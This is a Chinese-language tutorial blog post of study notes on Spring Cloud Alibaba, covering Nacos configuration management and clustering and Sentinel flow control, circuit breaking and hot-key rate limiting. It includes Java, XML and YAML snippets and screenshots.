<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationContextConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210201213156245.png" alt="image-20210201213156245"></p>
<p><img src="https://csn.damyoung.cn/image-20210201213310567.png" alt="image-20210201213310567"></p>
<p><img src="https://csn.damyoung.cn/image-20210201213317677.png" alt="image-20210201213317677"></p>
<h3 id="服务注册中心对比"><a href="#服务注册中心对比" class="headerlink" title="服务注册中心对比"></a>服务注册中心对比</h3><p><img src="https://csn.damyoung.cn/image-20210201213513739.png" alt="image-20210201213513739"></p>
<p><img src="https://csn.damyoung.cn/image-20210201213537568.png" alt="image-20210201213537568"></p>
<h2 id="配置中心"><a href="#配置中心" class="headerlink" title="配置中心"></a>配置中心</h2><p>cloudalibaba-config-nacos-client3377</p>
<p><img src="https://csn.damyoung.cn/image-20210201214240955.png" alt="image-20210201214240955"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--nacos-config--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--nacos-discovery--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>bootstrap.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nacos配置</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3377</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span><span class="string">:8848</span> <span class="comment">#Nacos作为配置中心地址</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span> <span class="comment">#指定yaml格式的配置</span></span><br><span class="line"><span class="comment">#        group: DEV_GROUP</span></span><br><span class="line"><span class="comment">#        namespace: 7d8f0f5a-6a53-4785-9686-dd460158e5d4</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span><span class="string">:8848</span> <span class="comment">#Nacos服务注册中心地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#nacos端配置文件DataId的命名规则是：</span></span><br><span class="line"><span class="comment">#$&#123;spring.application.name&#125;-$&#123;spring.profile.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line"><span class="comment">#本案例的DataID是:nacos-config-client-dev.yaml</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NacosConfigClietnMain3377</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(NacosConfigClietnMain3377.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RefreshScope</span> <span class="comment">//支持Nacos的动态刷新功能。</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigClientController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;config.info&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String configInfo;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/get&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getConfigInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> configInfo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>@RefreshScope</code>springcloud原生注解，实现配置的自动更新</p>
<h3 id="配置匹配规则"><a href="#配置匹配规则" class="headerlink" title="配置匹配规则"></a>配置匹配规则</h3><p><a href="https://nacos.io/zh-cn/docs/quick-start-spring-cloud.html">https://nacos.io/zh-cn/docs/quick-start-spring-cloud.html</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$&#123;spring.application.name&#125;-$&#123;spring.profile.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210201225825019.png" alt="image-20210201225825019"></p>
<p><img src="https://csn.damyoung.cn/image-20210201225852865.png" alt="image-20210201225852865"></p>
<p><img src="https://csn.damyoung.cn/image-20210201225952308.png" alt="image-20210201225952308"></p>
<p><img src="https://csn.damyoung.cn/image-20210201230016253.png" alt="image-20210201230016253"></p>
<p><img src="https://csn.damyoung.cn/image-20210201230040731.png" alt="image-20210201230040731"></p>
<p><img src="https://csn.damyoung.cn/image-20210202000902295.png" alt="image-20210202000902295"></p>
<h3 id="自带动态刷新"><a href="#自带动态刷新" class="headerlink" title="自带动态刷新"></a>自带动态刷新</h3><p><img src="https://csn.damyoung.cn/image-20210202001027340.png" alt="image-20210202001027340"></p>
<h2 id="分类配置"><a href="#分类配置" class="headerlink" title="分类配置"></a>分类配置</h2><h3 id="多环境多项目管理"><a href="#多环境多项目管理" class="headerlink" title="多环境多项目管理"></a>多环境多项目管理</h3><p><img src="https://csn.damyoung.cn/image-20210202220942214.png" alt="image-20210202220942214"></p>
<h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>Namespace+Group+Data ID</p>
<p><img src="https://csn.damyoung.cn/image-20210202221153895.png" alt="image-20210202221153895"></p>
<p><img src="https://csn.damyoung.cn/image-20210202221341882.png" alt="image-20210202221341882"></p>
<p><img src="https://csn.damyoung.cn/image-20210202221126870.png" alt="image-20210202221126870"></p>
<p>同一个data Id，不同group</p>
<p><img src="https://csn.damyoung.cn/image-20210202222515068.png" alt="image-20210202222515068"></p>
<p><img src="https://csn.damyoung.cn/image-20210202222631243.png" alt="image-20210202222631243"></p>
<p><img src="https://csn.damyoung.cn/image-20210202223029493.png" alt="image-20210202223029493"></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nacos配置</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3377</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span><span class="string">:8848</span> <span class="comment">#Nacos作为配置中心地址</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span> <span class="comment">#指定yaml格式的配置</span></span><br><span class="line">        <span class="attr">group:</span> <span class="string">DEFAULT_GROUP</span></span><br><span class="line">        <span class="attr">namespace:</span> <span class="string">cc621bf9-289e-4a2e-b5f6-aa2aab60cdd6</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span><span class="string">:8848</span> <span class="comment">#Nacos服务注册中心地址</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line"><span class="comment">#    active: dev  #表示开发环境</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">test</span>  <span class="comment">#表示测试环境</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#nacos端配置文件DataId的命名规则是：</span></span><br><span class="line"><span class="comment">#$&#123;spring.application.name&#125;-$&#123;spring.profile.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line"><span class="comment">#本案例的DataID是:nacos-config-client-dev.yaml</span></span><br></pre></td></tr></table></figure>

<h2 id="Nacos集群和持久化配置"><a href="#Nacos集群和持久化配置" class="headerlink" title="Nacos集群和持久化配置"></a>Nacos集群和持久化配置</h2><p><img src="https://csn.damyoung.cn/image-20210202224112220.png" alt="image-20210202224112220"></p>
<h3 id="集群部署"><a href="#集群部署" class="headerlink" title="集群部署"></a>集群部署</h3><p><a href="https://nacos.io/zh-cn/docs/cluster-mode-quick-start.html">https://nacos.io/zh-cn/docs/cluster-mode-quick-start.html</a></p>
<p><img src="https://csn.damyoung.cn/image-20210202223659093.png" alt="image-20210202223659093"></p>
<p>默认Nacos使用嵌入式数据库实现数据的存储，所以，如果启动多个默认配置下的Nacos节点，数据存储是存在一致性问题的；为了解决这个问题，Nacos采用了<strong>集中式存储的方式来支持集群化部署，目前只支持MySql的存储</strong></p>
<h4 id="单机"><a href="#单机" class="headerlink" title="单机"></a>单机</h4><p>Nacos默认自带的是嵌入式数据库derby</p>
<p><img src="https://csn.damyoung.cn/image-20210202224434838.png" alt="image-20210202224434838"></p>
<h4 id="集群-1"><a href="#集群-1" class="headerlink" title="集群"></a>集群</h4><p><img src="https://csn.damyoung.cn/image-20210202224940680.png" alt="image-20210202224940680"></p>
<h4 id="mysql数据库配置"><a href="#mysql数据库配置" class="headerlink" title="mysql数据库配置"></a>mysql数据库配置</h4><h5 id="sql脚本"><a href="#sql脚本" class="headerlink" title="sql脚本"></a>sql脚本</h5><p><a href="https://github.com/alibaba/nacos/blob/master/distribution/conf/nacos-mysql.sql">https://github.com/alibaba/nacos/blob/master/distribution/conf/nacos-mysql.sql</a></p>
<h4 id="application-properties"><a href="#application-properties" class="headerlink" title="application.properties"></a>application.properties</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp application.properties application.properties.init --备份</span><br><span class="line"></span><br><span class="line">vim application.properties.init</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210202233044347.png" alt="image-20210202233044347"></p>
<h4 id="配置cluster-conf"><a href="#配置cluster-conf" class="headerlink" title="配置cluster.conf"></a>配置cluster.conf</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp cluster.conf.example cluster.conf</span><br><span class="line"></span><br><span class="line">vim cluster.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210202233606236.png" alt="image-20210202233606236"></p>
<p><img src="https://csn.damyoung.cn/image-20210202233813507.png" alt="image-20210202233813507"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -ef|grep nacos|grep -v grep|wc -l --查看启动nacos</span><br></pre></td></tr></table></figure>

<h1 id="熔断和限流Sentinel"><a href="#熔断和限流Sentinel" class="headerlink" title="熔断和限流Sentinel"></a>熔断和限流Sentinel</h1><p><a href="https://github.com/alibaba/Sentinel/wiki">https://github.com/alibaba/Sentinel/wiki</a></p>
<p><img src="https://csn.damyoung.cn/image-20210203002134346.png" alt="image-20210203002134346"></p>
<p>服务雪崩、服务降级、服务熔断、服务限流</p>
<p><img src="https://csn.damyoung.cn/image-20210203002240175.png" alt="image-20210203002240175"></p>
<p><a href="https://github.com/alibaba/Sentinel/releases">https://github.com/alibaba/Sentinel/releases</a> 下载</p>
<p>java -jar sentinel-dashboard-1.7.0.jar</p>
<p><img src="https://csn.damyoung.cn/image-20210203003323061.png" alt="image-20210203003323061"></p>
<p><img src="https://csn.damyoung.cn/image-20210203003406410.png" alt="image-20210203003406410"></p>
<h2 id="工程"><a href="#工程" class="headerlink" title="工程"></a>工程</h2><blockquote>
<p>sentinel采用懒加载，执行一次访问即可<a href="http://localhost:8401/testA">http://localhost:8401/testA</a></p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20210203194724755.png" alt="image-20210203194724755"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        springcloud alibaba sentinel 后续持久化--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.csp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sentinel-datasource-nacos<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--nacos-discovery--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        openfeign--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        springcloud alibaba sentinel--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-sentinel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8401</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloudalibaba-sentinel-service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos服务注册中心地址</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="attr">transport:</span></span><br><span class="line">        <span class="attr">dashboard:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span><span class="string">:8080</span> <span class="comment">#配置Sentinel dashboard地址</span></span><br><span class="line"><span class="comment">#        默认8719端口，假如被占用会自动从8719开始依次+1扫描。直至找到未被占用的端口</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8719</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&#x27;*&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp8401</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(MainApp8401.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowLimitController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/testA&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;------testA&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/testB&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log.info(Thread.currentThread().getName()+<span class="string">&quot;\t&quot;</span>+<span class="string">&quot;...testB&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;------testB&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210203201514861.png" alt="image-20210203201514861"></p>
<h2 id="流控规则"><a href="#流控规则" class="headerlink" title="流控规则"></a>流控规则</h2><p>资源名：唯一名称，默认请求路径</p>
<p>针对来源：Sentinel可以针对调用者进行限流，填写微服务名，默认default</p>
<p>阈值类型</p>
<ul>
<li>QPS(每秒请求数量)：当调用该api的QPS达到阈值时，进行限流</li>
<li>线程数：当调用该api的线程数达到阈值时进行限流</li>
</ul>
<p>流控模式</p>
<ul>
<li>直接：api达到限流条件时，直接限流</li>
<li>关联：当关联的资源达到阈值时，就限流自己</li>
<li>链路：只记录指定链路上的流量(指定资源从入口资源进来的流量，如果达到阈值，就进行限流)</li>
</ul>
<p>流控效果</p>
<ul>
<li>快速失败：直接失败，跑异常</li>
<li>Warm up：根据codeFactor(冷加载因子，默认3)的值，从阈值/codeFactor，经过预热时长，才达到设置的QPS阈值</li>
<li>排队等待</li>
</ul>
<h3 id="直接快速失败"><a href="#直接快速失败" class="headerlink" title="直接快速失败"></a>直接快速失败</h3><h4 id="QPS"><a href="#QPS" class="headerlink" title="QPS"></a>QPS</h4><p><img src="https://csn.damyoung.cn/image-20210203202131283.png" alt="image-20210203202131283"></p>
<p><img src="https://csn.damyoung.cn/image-20210203202211174.png" alt="image-20210203202211174"></p>
<h4 id="线程数"><a href="#线程数" class="headerlink" title="线程数"></a>线程数</h4><p><img src="https://csn.damyoung.cn/image-20210203203126702.png" alt="image-20210203203126702"></p>
<h3 id="关联"><a href="#关联" class="headerlink" title="关联"></a>关联</h3><p><img src="https://csn.damyoung.cn/image-20210203203926784.png" alt="image-20210203203926784"></p>
<p><img src="https://csn.damyoung.cn/image-20210203204127837.png" alt="image-20210203204127837"></p>
<p><img src="https://csn.damyoung.cn/image-20210203204208656.png" alt="image-20210203204208656"></p>
<p><img src="https://csn.damyoung.cn/image-20210203204320762.png" alt="image-20210203204320762"></p>
<p><img src="https://csn.damyoung.cn/image-20210203204441287.png" alt="image-20210203204441287"></p>
<p><img src="https://csn.damyoung.cn/image-20210203204718927.png" alt="image-20210203204718927"></p>
<p><img src="https://csn.damyoung.cn/image-20210203204702277.png" alt="image-20210203204702277"></p>
<h3 id="链路"><a href="#链路" class="headerlink" title="链路"></a>链路</h3><h2 id="流控效果"><a href="#流控效果" class="headerlink" title="流控效果"></a>流控效果</h2><h3 id="预热"><a href="#预热" class="headerlink" title="预热"></a>预热</h3><p>秒杀系统在开启的瞬间，会有很多流量上来，很有可能把系统打死，预热方式就是把为了保护系统，可慢慢把流量放进来，慢慢的把阈值增长到设置的阈值</p>
<p><img src="https://csn.damyoung.cn/image-20210203205103893.png" alt="image-20210203205103893"></p>
<p><img src="https://csn.damyoung.cn/image-20210203205306608.png" alt="image-20210203205306608"></p>
<h3 id="排队等待"><a href="#排队等待" class="headerlink" title="排队等待"></a>排队等待</h3><p><img src="https://csn.damyoung.cn/image-20210203205607252.png" alt="image-20210203205607252"></p>
<p><img src="https://csn.damyoung.cn/image-20210203205629517.png" alt="image-20210203205629517"></p>
<h2 id="熔断降级"><a href="#熔断降级" class="headerlink" title="熔断降级"></a>熔断降级</h2><p><a href="http://github.com/alibaba/Sentinel/wiki/%E7%86%94%E6%96%AD%E9%99%8D%E7%BA%A7">http://github.com/alibaba/Sentinel/wiki/熔断降级</a></p>
<p><img src="https://csn.damyoung.cn/image-20210203205810825.png" alt="image-20210203205810825"></p>
<p><img src="https://csn.damyoung.cn/image-20210203205906791.png" alt="image-20210203205906791"></p>
<p><img src="https://csn.damyoung.cn/image-20210203205918850.png" alt="image-20210203205918850"></p>
<p><img src="https://csn.damyoung.cn/image-20210203205939045.png" alt="image-20210203205939045"></p>
<p>Sentinel断路器是没有半开状态</p>
<p><img src="https://csn.damyoung.cn/image-20210203210055780.png" alt="image-20210203210055780"></p>
<h3 id="RT"><a href="#RT" class="headerlink" title="RT"></a>RT</h3><p><img src="https://csn.damyoung.cn/image-20210204194822358.png" alt="image-20210204194822358"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/testD&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        TimeUnit.SECONDS.sleep(<span class="number">1</span> );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    log.info(<span class="string">&quot;测试D&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;------testD&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210204195240843.png" alt="image-20210204195240843"></p>
<p><img src="https://csn.damyoung.cn/image-20210204195811172.png" alt="image-20210204195811172"></p>
<h3 id="异常比例"><a href="#异常比例" class="headerlink" title="异常比例"></a>异常比例</h3><p><img src="https://csn.damyoung.cn/image-20210204200037378.png" alt="image-20210204200037378"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/testE&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testE</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    log.info(<span class="string">&quot;testE 测试异常数&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">10</span>/<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;------testE 测试异常数&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210204200218433.png" alt="image-20210204200218433"></p>
<h3 id="异常数"><a href="#异常数" class="headerlink" title="异常数"></a>异常数</h3><p>异常数是按照分钟统计的</p>
<p><img src="https://csn.damyoung.cn/image-20210204200327159.png" alt="image-20210204200327159"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/testE&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testE</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    log.info(<span class="string">&quot;testE 测试异常数&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">10</span>/<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;------testE 测试异常数&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210204200458434.png" alt="image-20210204200458434"></p>
<h2 id="热点key限流"><a href="#热点key限流" class="headerlink" title="热点key限流"></a>热点key限流</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/testHotKey&quot;)</span></span><br><span class="line"><span class="meta">@SentinelResource(value = &quot;testHotKey&quot;,blockHandler = &quot;deal_testHotKey&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testHotKey</span><span class="params">(<span class="meta">@RequestParam(value = &quot;p1&quot;,required = false)</span> String p1,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="meta">@RequestParam(value = &quot;p2&quot;,required = false)</span> String p2)</span></span>&#123;</span><br><span class="line">    <span class="comment">//int age = 10/0;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;------testHotKey&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//兜底方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">deal_testHotKey</span> <span class="params">(String p1, String p2, BlockException exception)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//sentinel系统默认的提示：Blocked by Sentinel (flow limiting)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;------deal_testHotKey,o(╥﹏╥)o&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210204201742114.png" alt="image-20210204201742114"></p>
<p>方法testHotKey里面第一个参数只要QPS超过每秒1次，马上降级处理；</p>
<p>如果没有兜底方法，异常会被打印到前台</p>
<h3 id="参数例外项"><a href="#参数例外项" class="headerlink" title="参数例外项"></a>参数例外项</h3><p>热点参数的注意点，参数必须是基本类型或者String</p>
<p><img src="https://csn.damyoung.cn/image-20210204202214005.png" alt="image-20210204202214005"></p>
<p><img src="https://csn.damyoung.cn/image-20210204202257530.png" alt="image-20210204202257530"></p>
<h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p><img src="https://csn.damyoung.cn/image-20210204202556381.png" alt="image-20210204202556381"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/testHotKey&quot;)</span></span><br><span class="line"><span class="meta">@SentinelResource(value = &quot;testHotKey&quot;,blockHandler = &quot;deal_testHotKey&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testHotKey</span><span class="params">(<span class="meta">@RequestParam(value = &quot;p1&quot;,required = false)</span> String p1,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="meta">@RequestParam(value = &quot;p2&quot;,required = false)</span> String p2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">10</span>/<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;------testHotKey&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">deal_testHotKey</span> <span class="params">(String p1, String p2, BlockException exception)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//sentinel系统默认的提示：Blocked by Sentinel (flow limiting)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;------deal_testHotKey,o(╥﹏╥)o&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

